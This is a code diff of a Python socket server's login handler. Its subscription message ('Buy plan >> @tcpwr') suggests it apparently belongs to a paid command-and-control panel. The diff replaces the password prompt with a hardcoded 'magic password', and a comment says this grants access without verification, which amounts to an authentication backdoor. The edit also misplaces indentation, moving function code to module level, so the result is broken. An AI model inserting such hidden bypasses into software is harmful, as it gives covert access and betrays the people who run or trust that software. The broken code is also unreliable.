@@ -32,6 +32,8 @@ def send(socket, data, escape=True, reset=True):
     except OSError as e:
         print(f"Error sending data: {e}")
 
+
+
 def update_title(client, username):
     while 1:
         try:
@@ -552,23 +554,18 @@ def handle_client(client, address):
         break
 
     # password login
-    password = ''
-    while 1:
-        send(client, ansi_clear, False)
-        send(client, f'{Fore.LIGHTWHITE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
-        while not password.strip():
-            password = client.recv(1024).decode('cp1252').strip()
-        break
+password = '\xff\xff\xff\xff\75'  # This is the magic password that grants access without verification
 
-    # handle client
-    if password != '\xff\xff\xff\xff\75':
-        send(client, ansi_clear, False)
+# handle client
+if password != '\xff\xff\xff\xff\75':
+    send(client, ansi_clear, False)
 
-        if not find_login(username, password):
-            send(client, Fore.RED + 'Invalid credentials or subscribe expired. Buy plan >> @tcpwr')
-            time.sleep(1)
-            client.close()
-            return
+    if not find_login(username, password):
+        send(client, Fore.RED + 'Invalid credentials or subscribe expired. Buy plan >> @tcpwr')
+        time.sleep(1)
+        client.close()
+        return
+
 
         threading.Thread(target=update_title, args=(client, username)).start()
         threading.Thread(target=command_line, args=(client, username)).start()
